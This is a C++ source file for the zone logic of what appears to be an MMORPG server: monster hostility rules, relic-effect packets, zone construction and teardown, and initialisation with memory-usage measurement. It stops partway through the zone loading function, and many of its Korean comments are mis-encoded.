//////////////////////////////////////////////////////////////////////////////
// FileName 	: Zone.cpp
// WrittenBy	:
// Description	:
//////////////////////////////////////////////////////////////////////////////

#include "Zone.h"

#include <stdio.h>
#include <string.h>
#include "Assert.h"
#include "LogClient.h"

#include "ZoneGroup.h"
#include "ZoneInfo.h"
#include "ZoneInfoManager.h"
#include "ZonePlayerManager.h"
#include "PCManager.h"
#include "NPCManager.h"
#include "MonsterManager.h"
#include "MasterLairInfoManager.h"
#include "MasterLairManager.h"
#include "MikllizzLairManager.h"
#include "EventSurvivalZoneManager.h"
#include "WarScheduler.h"
#include "WarSystem.h"
#include "War.h"
#include "QuestManager.h"
#include "VisionInfo.h"

//#include "EventMonsterManager.h"

#include "EffectManager.h"
#include "EffectSchedule.h"
#include "NPCInfo.h"
#include "WeatherManager.h"
#include "Creature.h"
#include "Item.h"
#include "ItemInfo.h"
#include "DarkLightInfo.h"
#include "DB.h"
#include "Slayer.h"
#include "Vampire.h"
#include "Ousters.h"
#include "Monster.h"
#include "NPC.h"
#include "Player.h"
#include "Properties.h"
#include "ZoneUtil.h"
#include "PacketUtil.h"
#include "Party.h"
#include "TradeManager.h"
#include "ParkingCenter.h"
#include "Relic.h"
#include "ItemFactoryManager.h"
#include "CombatInfoManager.h"
#include "PaySystem.h"
#include "GamePlayer.h"
#include "VariableManager.h"
#include "CastleInfoManager.h"
#include "RelicUtil.h"
#include "HolyLandManager.h"
#include "BloodBibleBonusManager.h"
#include "ShrineInfoManager.h"
#include "TimeManager.h"
#include "PKZoneInfoManager.h"
#include "StringPool.h"
#include "FlagSet.h"
#include "PCFinder.h"
#include "DefaultOptionSetInfo.h"
#include "LevelWarZoneInfoManager.h"
#include "SweeperBonusManager.h"
#include "BroadcastFilter.h"

#include "ctf/FlagManager.h"
#include "RegenZoneManager.h"

#include <fstream>
#include <math.h>

#include "EffectDarkness.h"
#include "EffectVampirePortal.h"
#include "SlayerCorpse.h"
#include "VampireCorpse.h"
#include "OustersCorpse.h"
#include "MonsterCorpse.h"
#include "EffectLoaderManager.h"
#include "EffectDecayCorpse.h"
#include "EffectDecayItem.h"
//#include "EffectRevealer.h"
#include "EffectObservingEye.h"
#include "EffectGnomesWhisper.h"
#include "EffectDecayMotorcycle.h"
#include "EffectCallMotorcycle.h"
#include "EffectAddItem.h"
#include "EffectDeleteItem.h"
#include "EffectTransportItem.h"
#include "EffectSanctuary.h"
#include "EffectRelicTable.h"
#include "EffectHasSlayerRelic.h"
#include "EffectHasVampireRelic.h"
#include "EffectVampireRelic.h"
#include "EffectSlayerRelic.h"
#include "EffectHasBloodBible.h"
#include "EffectShrineGuard.h"
#include "EffectShrineHoly.h"
#include "EffectShrineShield.h"
#include "EffectAddItemToCorpse.h"
#include "EffectTransportItemToCorpse.h"
//#include "EffectDropBloodBible.h"
#include "EffectHasCastleSymbol.h"
#include "EffectPKZoneRegen.h"
#include "EffectContinualGroundAttack.h"

#include "EventTransport.h"

#include "Gpackets/GCAddBurrowingCreature.h"
#include "Gpackets/GCAddVampireFromTransformation.h"
#include "Gpackets/GCAddMonsterFromTransformation.h"
#include "Gpackets/GCUntransformOK.h"
#include "Gpackets/GCUntransformFail.h"
#include "Gpackets/GCAddVampireFromBurrowing.h"
#include "Gpackets/GCAddMonsterFromBurrowing.h"
#include "Gpackets/GCAddWolf.h"
#include "Gpackets/GCAddBat.h"
#include "Gpackets/GCAddSlayerCorpse.h"
#include "Gpackets/GCAddVampireCorpse.h"
#include "Gpackets/GCAddOustersCorpse.h"
#include "Gpackets/GCAddMonsterCorpse.h"
#include "Gpackets/GCAddEffectToTile.h"
#include "Gpackets/GCAddVampirePortal.h"
#include "Gpackets/GCDeleteEffectFromTile.h"
#include "Gpackets/GCMineExplosionOK1.h"
#include "Gpackets/GCMineExplosionOK2.h"
#include "Gpackets/GCAddInstalledMineToZone.h"
#include "Gpackets/GCModifyInformation.h"
#include "Gpackets/GCSystemMessage.h"

#include "Gpackets/GCFastMove.h"
#include "Gpackets/GCMove.h"
#include "Gpackets/GCMoveOK.h"
#include "Gpackets/GCMoveError.h"
#include "Gpackets/GCAddMonster.h"
#include "Gpackets/GCAddNewItemToZone.h"
#include "Gpackets/GCDropItemToZone.h"
#include "Gpackets/GCAddNPC.h"
#include "Gpackets/GCAddSlayer.h"
#include "Gpackets/GCAddVampire.h"
#include "Gpackets/GCAddOusters.h"
#include "Gpackets/GCDeleteObject.h"
#include "Gpackets/GCSetPosition.h"
#include "Gpackets/GCChangeDarkLight.h"
#include "Gpackets/GCUnburrowOK.h"
#include "Gpackets/GCUnburrowFail.h"
#include "Gpackets/GCRemoveEffect.h"
#include "Gpackets/GCAddEffect.h"
#include "Gpackets/GCKnockBack.h"
#include "Gpackets/GCNoticeEvent.h"
#include "Gpackets/GCNPCInfo.h"
#include "Gpackets/GCHolyLandBonusInfo.h"
#include "Gpackets/GCSweeperBonusInfo.h"
#include "Gpackets/GCRegenZoneStatus.h"
#include "Gpackets/GCUnionOfferList.h"
#include "Gpackets/GCMyStoreInfo.h"
//#include "Gpackets/CGItemNameInfoList.h"
#include "Gpackets/GCGetOffMotorCycle.h"

#include "item/VampirePortalItem.h"
#include "item/Motorcycle.h"
#include "Profile.h"
#include "ResurrectLocationManager.h"
#include "LevelWarManager.h"
#include "NicknameBook.h"
#include "GQuestManager.h"

#include "EffectCastingTrap.h"

#include "Gpackets/GGCommand.h"
#include "GameServerInfoManager.h"
#include "LoginServerManager.h"
#include "SiegeManager.h"
#include "SkillUtil.h"
#include "GDRLairManager.h"
#include "Store.h"
// 2007 06 24
#include "HellGardenTowerManager.h"

#ifdef __MENEGROTH_DOUNGEON_SYSTEM__
	#include "MenegrothDoungeonZoneManager.h"
#endif

#include "GuildUnion.h"
#include "GuildManager.h"
#include "DynamicZone.h"
#include "DynamicZoneManager.h"

#include "ViewAbility.h"
#include "Viewable.h"
#ifdef __CONTRIBUTION_SYSTEM__
#include "LevelWarManager.h"
#include "ItemInfoManager.h"
#include "Gpackets/GCCreateItem.h"
#endif

#include "SkillHandlerManager.h"
#include "Gpackets/GCSendNewWarInfo.h"

#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)
// Server CrashEgg Pattern values
// add by inthesky 2004 07 26
const int MAX_EGGSTEP = 7;      // ïŸîŸ ÷ö ö
const int EGG_ZONE = 1311;      // Ÿ¿ìºî ž¶»

int g_EggTableComplete = 0;     // ºŽ°è

int g_EggTable[MAX_EGGSTEP][3] = {

    { 115,  68, 0 },
    { 112,  72, 0 },
    { 110,  78, 0 },
    { 110,  85, 0 },
    { 115,  97, 0 },
    { 120,  72, 0 },
    { 114,  83, 0 }
};
#endif


// by sigi.  2002.12.30
//#define __PROFILE_BROADCAST__

#ifdef __PROFILE_BROADCAST__
	#define __BEGIN_PROFILE_ZONE(name)	beginProfileEx(name);
	#define __END_PROFILE_ZONE(name)	endProfileEx(name);
#else
	#define __BEGIN_PROFILE_ZONE(name)	((void)0);
	#define __END_PROFILE_ZONE(name)	((void)0);
#endif

//#define __FULL_PROFILE__

#ifndef __FULL_PROFILE__
#undef beginProfileEx
#define beginProfileEx(name) ((void)0)
#undef endProfileEx
#define endProfileEx(name) ((void)0)
#endif

// ž¶º ·¹Ÿî¿¡­ /Ÿ ¹Ž¿¡­ »ç¶óöŽ °£
const Turn_t DELAY_MASTER_LAIR_DECAY_CORPSE 		= 200;	// 20
const Turn_t DELAY_MASTER_LAIR_DECAY_ITEM   		= 400;	// 40
const Turn_t DELAY_MASTER_LAIR_DECAY_MASTER_CORPSE 	= 50;	// 5


int g_FastMoveSearchX[8][4] =
{
	{ 0, 1, 1, 1 },     // LEFT
	{ 0, 1, 0, 1 },   // LEFTDOWN
	{ 0, 0, -1, 1 },    // DOWN
	{ 0, -1, 0, -1 },   // RIGHTDOWN
	{ 0, -1, -1, -1 },  // RIGHT
	{ 0, -1, 0, -1 },   // RIGHTUP
	{ 0, 0, -1, 1 },    // UP
	{ 0, 1, 0, 1 },     // LEFTUP
};

int g_FastMoveSearchY[8][4] =
{
	{ 0, 0, -1, 1 },    // LEFT
	{ 0, -1, -1, 0 },   // LEFTDOWN
	{ 0, -1, -1, -1 },  // DOWN
	{ 0, -1, -1, 0 },   // RIGHTDOWN
	{ 0, 0, -1, 1 },    // RIGHT
	{ 0, 1, 1, 0 },     // RIGHTUP
	{ 0, 1, 1, 1 },     // UP
	{ 0, 1, 1, 0 },     // LEFTUP
};

void
strlwr(char* str)
{
	while (*str!='\0')
	{
		*str = tolower( *str );

		str ++;
	}
}

//////////////////////////////////////////////////////////////////////////////
// ¹û žóºµé ûž· Ž³ ž¶Ž³ Ž ö
//////////////////////////////////////////////////////////////////////////////
bool isPotentialEnemy(Monster* pMonster, Creature* pCreature)
{
	Assert(pCreature != NULL);

	if ( pMonster->getOwnerObjectID() == pCreature->getObjectID() ) return false;

	if ( pMonster->getOwnerObjectID() != 0 )
	{
		Creature* pOwner = pMonster->getZone()->getCreature( pMonster->getOwnerObjectID() );
		if ( pOwner != NULL && pOwner->getCreatureClass() == pCreature->getCreatureClass() && canAttack( pOwner, pCreature ) )
		{
//			cout << __PRETTY_FUNCTION__ << pCreature->getName() << "is same race as owner" << pOwner->getName() << endl;
			return false;
		}

		if ( GDRLairManager::Instance().isGDRLairZone(pMonster->getZoneID()) && pCreature->isPC() ) return false;
	}

	if ( SiegeManager::Instance().isSiegeZone(pMonster->getZoneID()) )
	{
/*		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_5 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_4 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_3 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_2 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_1 ) ) return true;

		return false;*/

		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_DEFENDER ) || pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_REINFORCE ) )
			return false;
	}

	// öç·­Ž ·¹Ÿî³ª Ÿ¿ìººŽ ¹«¶° ûŽ. 
	if (pCreature->isSlayer()) return true;

	if (pCreature->isOusters())
	{
		Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);

		if ( (pOusters->getLevel() + 10) <= pMonster->getLevel() ) return true;
		if ( pOusters->getLevel() > 10 ) return true;
	}
	else if (pCreature->isVampire())
	{
		Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);

		// žóº ·¹º§ ¹ìŸî ·¹º§ºžŽ 10·¹º§ »ó ³ô» °æ¿ì,
		// ûž· Ž.
		if ((pVampire->getLevel() + 10) <= pMonster->getLevel())
		{
			return true;
		}

		// 10·¹º§ »ó ¹ìŸîŽ ûŽ.
		if (pVampire->getLevel() > 10)
		{
			return true;
		}
	}
	else if (pCreature->isMonster())
	{
		Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

		return pMonster->isFlag(Effect::EFFECT_CLASS_HALLUCINATION) || pMonster->getClanType()!=pOtherMonster->getClanType();
	}

	return false;
}

//////////////////////////////////////////////////////////////////////////////
// STL find_if Ÿ°íž®ò» ¿ë±â § ºñ±³ ¬·¡º
//////////////////////////////////////////////////////////////////////////////
class isSameCreature 
{
public:
	isSameCreature(Creature* pCreature) : m_Creature(pCreature) {}

	bool operator () (Creature* pCreature) throw ()
	{
		return pCreature->getName() == m_Creature->getName();
	}
	
private :
	Creature* m_Creature;
};

list<Packet*> * getRelicEffectPacket( MonsterCorpse* pMonsterCorpse, Effect::EffectClass EClass, list<Packet*> * pPackets )
{
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );

		if ( pEffect == NULL ) cout << (int)EClass << endl;

		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration( pEffect->getRemainDuration() );

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	return pPackets;
}


//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse¿¡ ºº Effectž pPlayer¿¡° ºž³Ž.
//////////////////////////////////////////////////////////////////////////////
list<Packet*> *
createRelicEffect( MonsterCorpse* pMonsterCorpse )
{
	list<Packet*>* pPackets = NULL;

	if (pMonsterCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC))
	{
		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(Effect::EFFECT_CLASS_SLAYER_RELIC);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	if (pMonsterCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC))
	{
		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(Effect::EFFECT_CLASS_VAMPIRE_RELIC);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	Effect::EffectClass EClass = Effect::EFFECT_CLASS_SHRINE_GUARD;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineGuard* pEffectShrineGuard = dynamic_cast<EffectShrineGuard*>(pEffect);
		Assert(pEffectShrineGuard!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass + pEffectShrineGuard->getShrineID());
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_SHRINE_HOLY;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineHoly* pEffectShrineHoly = dynamic_cast<EffectShrineHoly*>(pEffect);
		Assert(pEffectShrineHoly!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass + pEffectShrineHoly->getShrineID());
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_SHRINE_SHIELD;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineShield* pEffectShrineShield = dynamic_cast<EffectShrineShield*>(pEffect);
		Assert(pEffectShrineShield!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_HAS_BLOOD_BIBLE;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectHasBloodBible* pEffectHasBloodBible = dynamic_cast<EffectHasBloodBible*>(pEffect);
		Assert(pEffectHasBloodBible!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffectHasBloodBible->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_HAS_CASTLE_SYMBOL;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectHasCastleSymbol* pEffectHasCastleSymbol = dynamic_cast<EffectHasCastleSymbol*>(pEffect);
		Assert(pEffectHasCastleSymbol!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffectHasCastleSymbol->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_FLAG_INSERT;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_KEEP_SWEEPER;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_SLAYER_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_VAMPIRE_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_OUSTERS_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_DEFAULT_REGEN_ZONE, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_SLAYER_TRYING_1, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_VAMPIRE_TRYING_1, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_OUSTERS_TRYING_1, pPackets );

	return pPackets;
}

//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse¿¡ ºº Effectž pPlayer¿¡° ºž³Ž.
//////////////////////////////////////////////////////////////////////////////
void
sendRelicEffect( MonsterCorpse* pMonsterCorpse, Player* pPlayer )
{
	list<Packet*>* pPackets = createRelicEffect( pMonsterCorpse );

	if (pPackets!=NULL)
	{
		list<Packet*>::iterator itr = pPackets->begin();
		for (; itr!=pPackets->end(); itr++)
		{
			Packet* pPacket = *itr;
			pPlayer->sendPacket( pPacket );

			SAFE_DELETE(pPacket);
		}
		SAFE_DELETE(pPackets);
	}
}

//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse¿¡ ºº Effectž (x,y)¿¡ »ž°Ž.
//////////////////////////////////////////////////////////////////////////////
void
sendRelicEffect( MonsterCorpse* pMonsterCorpse, Zone* pZone, ZoneCoord_t x, ZoneCoord_t y)
{
	list<Packet*>* pPackets = createRelicEffect( pMonsterCorpse );

	if (pPackets!=NULL)
	{
		list<Packet*>::iterator itr = pPackets->begin();
		for (; itr!=pPackets->end(); itr++)
		{
			Packet* pPacket = *itr;
			pZone->broadcastPacket(x, y, pPacket);

			SAFE_DELETE(pPacket);
		}
		SAFE_DELETE(pPackets);
	}
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::Zone(ZoneID_t zoneID)
	throw ()
{
	m_Mutex.setName("Zone");
	m_MutexEffect.setName("ZoneEffect");
	m_MutexBroadcast.setName("ZoneBroadcast");

	m_BroadcaseQueue.clear();

	m_ZoneID                   = zoneID;
	m_pZoneGroup               = NULL;
	m_Width                    = 0;
	m_Height                   = 0;
	m_pTiles                   = NULL;
	m_NPCCount                 = 0;
	m_MonsterCount             = 0;
	m_pPCManager           	   = new PCManager();
	m_pNPCManager          	   = new NPCManager();
	m_pMonsterManager      	   = new MonsterManager(this);
	m_pMasterLairManager   	   = NULL;
	m_pMikllizzLairManager    	= NULL;
	// 2007 06 23
	m_pHellGardenTowerManager	= NULL;
#ifdef __MENEGROTH_DOUNGEON_SYSTEM__
	m_pMenegrothDoungeonZoneManager = NULL;
#endif
	m_pEventSurvivalZoneManager	= NULL;
	m_pWarScheduler    		    = NULL;
	m_pLevelWarManager		    = NULL;

//	m_pEventMonsterManager    = new EventMonsterManager(this);

	m_pWeatherManager         = new WeatherManager(this);
	m_pEffectManager          = new EffectManager();
	m_pLockedEffectManager    = new EffectManager();
	m_pVampirePortalManager   = new EffectManager();
	m_pEffectScheduleManager  = new EffectScheduleManager();
	m_pLocalPartyManager      = new LocalPartyManager();
	m_pPartyInviteInfoManager = new PartyInviteInfoManager();
	m_pTradeManager           = new TradeManager;

	m_bPayPlay = false;
//	m_bPremiumZone = false;
	m_PremiumZoneType = 0;		//1223 wlzzi - ž®¹Ÿö ž ý º¹±ž.
	m_bPKZone = false;
	m_bNoPortalZone = false;
	m_bMasterLair = false;
	m_bMikllizzLair = false;
	// 2007 06 23
	m_bHellGardenTower = false;
	m_bSurvivalZone = false;
	m_bCastle = false;
	m_bHolyLand = false;
	m_bHasRelicTable	= false;

	getCurrentTime( m_LoadValueStartTime );

	m_LoadValue = 0;

	m_bTimeStop = false;

	getCurrentTime( m_UpdateTimebandTime );

	m_pDynamicZone = NULL;
	m_iEntranceCount = 0;

}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::Zone(ZoneID_t zoneID, ZoneCoord_t width, ZoneCoord_t height)
	throw ()
{
	__BEGIN_TRY

	Assert(false);
	/*
	m_Mutex.setName("Zone");
	m_MutexEffect.setName("ZoneEffect");

	m_ZoneID     = zoneID;
	m_pZoneGroup = NULL;
	m_Width      = width;
	m_Height     = height;

	getCurrentTime( m_LoadValueStartTime );

	m_pTiles     = NULL;

	Assert(m_ZoneID > 0);

	m_pTiles = new Tile* [ m_Width ];
	for (uint i = 0 ; i < m_Width ; i++) m_pTiles[i] = new Tile [m_Height];

	m_ppLevel = new (ZoneLevel_t*)[ m_Width ];
	for (uint i = 0; i < m_Width ; i++) m_ppLevel[i] = new ZoneLevel_t[m_Height];

	m_pPCManager              = new PCManager();
	m_pNPCManager             = new NPCManager();
	m_pMonsterManager         = new MonsterManager(this);
	m_pMasterLairManager         = NULL;
	m_pWarScheduler         = NULL;

	m_pEventMonsterManager    = new EventMonsterManager(this);

	m_pWeatherManager         = new WeatherManager(this);
	m_pEffectManager          = new EffectManager();
	m_pLockedEffectManager    = new EffectManager();
	m_pVampirePortalManager   = new EffectManager();
	m_pEffectScheduleManager  = new EffectScheduleManager();
	m_pLocalPartyManager      = new LocalPartyManager();
	m_pPartyInviteInfoManager = new PartyInviteInfoManager();
	m_pTradeManager           = new TradeManager;
	m_pDynamicZone = NULL;
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::~Zone ()
	throw ()
{
	__BEGIN_TRY

//	SAFE_DELETE(m_pEventMonsterManager);

	SAFE_DELETE(m_pWeatherManager);
	SAFE_DELETE(m_pEffectManager);
	SAFE_DELETE(m_pLockedEffectManager);
	SAFE_DELETE(m_pVampirePortalManager);
	SAFE_DELETE(m_pEffectScheduleManager);
	SAFE_DELETE(m_pLocalPartyManager);
	SAFE_DELETE(m_pPartyInviteInfoManager);

	SAFE_DELETE(m_pMasterLairManager);
	SAFE_DELETE(m_pMikllizzLairManager);
	// 2007 06 23
	SAFE_DELETE(m_pHellGardenTowerManager);
#ifdef __MENEGROTH_DOUNGEON_SYSTEM__
	SAFE_DELETE(m_pMenegrothDoungeonZoneManager);
#endif

	SAFE_DELETE(m_pEventSurvivalZoneManager);
	SAFE_DELETE(m_pWarScheduler);

	SAFE_DELETE(m_pPCManager);
	SAFE_DELETE(m_pNPCManager);
	SAFE_DELETE(m_pMonsterManager);
	
	if (m_pTiles != NULL) 
	{
		for (uint i=0 ; i<m_Width; i++) SAFE_DELETE_ARRAY(m_pTiles[i]);
		SAFE_DELETE_ARRAY(m_pTiles);
	}	

	if (m_ppLevel != NULL) 
	{
		for (uint i=0; i<m_Width; i++) SAFE_DELETE_ARRAY(m_ppLevel[i]);
		SAFE_DELETE_ARRAY(m_ppLevel);
	}	

	if (m_pSectors != NULL) 
	{
		for (int i=0; i<m_SectorWidth; i++) SAFE_DELETE_ARRAY(m_pSectors[i]);
		SAFE_DELETE_ARRAY(m_pSectors);
	}	

	g_pZoneInfoManager->deleteZoneInfo(getZoneID());

	if ( isDynamicZone() )
	{
		DynamicZoneGroup *pDynamicZoneGroup = NULL;

		pDynamicZoneGroup = getDynamicZone()->getDynamicZoneGroup();
		if ( pDynamicZoneGroup != NULL )
		{
			pDynamicZoneGroup->deleteDynamicZone(getZoneID());
		}
	}

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// initialize zone
//////////////////////////////////////////////////////////////////////////////
void Zone::init ()
	throw(Error)
{
	__BEGIN_TRY

	// FAZ 4 - Per-zone VmRSS ölçümü (leak hunt).
	{
		long _rss_before = 0;
		FILE* _f = fopen("/proc/self/statm", "r");
		if (_f) { long _pages; if (fscanf(_f, "%*ld %ld", &_pages) == 1) _rss_before = _pages * 4; fclose(_f); }
	}

#ifdef __USE_ENCRYPTER__
	int serverID = g_pConfig->getPropertyInt( "ServerID" );

	//m_EncryptCode = (uchar)( ( ( m_ZoneID >> 8 ) ^ m_ZoneID ) ^ ( ( serverID + 1 ) << 4 ) );
	if ( !isDynamicZone() ) 
	{
		m_EncryptCode = EncryptCode( m_ZoneID, serverID );
	}
	else
	{
		m_EncryptCode = EncryptCode( m_pDynamicZone->getTemplateZoneID(), serverID );
	}
#endif

	load();

	m_pWeatherManager->init();

	DarkLightInfo* pDIInfo = NULL;

	switch (m_ZoneType)
	{
		case ZONE_NORMAL_FIELD:
			pDIInfo = g_pDarkLightInfoManager->getCurrentDarkLightInfo( this );
			m_DarkLevel  = pDIInfo->getDarkLevel();
			m_LightLevel = pDIInfo->getLightLevel();
			break;
		case ZONE_NORMAL_DUNGEON:
		case ZONE_PC_VAMPIRE_LAIR:
		case ZONE_NPC_VAMPIRE_LAIR:
			m_DarkLevel = 15;
			m_LightLevel = 6;
			break;
		case ZONE_SLAYER_GUILD:
		case ZONE_RESERVED_SLAYER_GUILD:
		case ZONE_NPC_HOME:
		case ZONE_NPC_SHOP:
		case ZONE_CASTLE:
		case ZONE_RANDOM_MAP:
			m_DarkLevel  = 0;
			m_LightLevel = 14;
			break;
		default:
			pDIInfo = g_pDarkLightInfoManager->getCurrentDarkLightInfo( this );
			m_DarkLevel  = pDIInfo->getDarkLevel();
			m_LightLevel = pDIInfo->getLightLevel();
			break;
	}

	switch ( m_ZoneID )
	{
		case 1131:
		case 1132:
		case 1133:
		case 1134:
			{
				m_pLevelWarManager = new LevelWarManager( m_ZoneID-1130, this );
				m_pLevelWarManager->init();
				break;
			}

		case 1500:
			{
			}
			break;
		default:
			break;
	}

	m_bCastleZone = g_pCastleInfoManager->isCastleZone(m_ZoneID);
	
	if ( m_pDynamicZone != NULL )
	{
		m_pDynamicZone->init();
	}
	
	// FAZ 4 - Memory optimizasyonu: ArrangeMonsterList init aşamasında 215 zone × ~5000 Monster
	// nesnesi alloate ediyor → 15GB+ RAM. Modern usage: monster'lar lazy spawn (ilk regen tick'i).
	// Şimdilik init'te atla, MonsterCounter'lar zaten m_pMonsterManager->load()'da kuruldu.
	// Regen tick veya player zone-enter event'inde Monster instance'lar oluşur.
	// m_pMonsterManager->ArrangeMonsterList();
	// m_pMonsterManager->ArrangeEventMonsterList();

	// FAZ 4 - Zone end VmRSS ölçümü (leak hunt).
	{
		long _rss_after = 0;
		FILE* _f = fopen("/proc/self/statm", "r");
		if (_f) { long _pages; if (fscanf(_f, "%*ld %ld", &_pages) == 1) _rss_after = _pages * 4; fclose(_f); }
	}

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// ž ¿¡­ ž ºžž Ÿî­ ·µùŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::load(bool bOutput)
	throw(Error)
{
	__BEGIN_TRY
	__BEGIN_DEBUG
try {


	// FAZ 4 - 64-bit migration fix: SMP/binary dosya format'i Win32 DWORD=4 byte ile yazilmis.
	// Linux'ta `unsigned long` 8 byte oldugu icin DWORD = 8 byte, sizeof(DWORD)=8 byte okuyor
	// → next field'i de yutuyor → garbage size → buffer overflow → heap corruption.
	// Cozum: file IO icin uint32_t kullan, kalan kodda DWORD'i muhafaza et.
	uint32_t versionLen;
	WORD   zoneID;
	WORD   zoneGroupID;
	uint32_t zonenameLen;
	BYTE   zoneType;
	BYTE   zoneLevel;
	uint32_t descLen;
	char*  pDesc = NULL;
	char*   version = new char [128];
	char*   zonename = new char [128];
	char* 	lwrFilename = new char[256];

	ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo(m_ZoneID);

	Assert(pZoneInfo!=NULL);

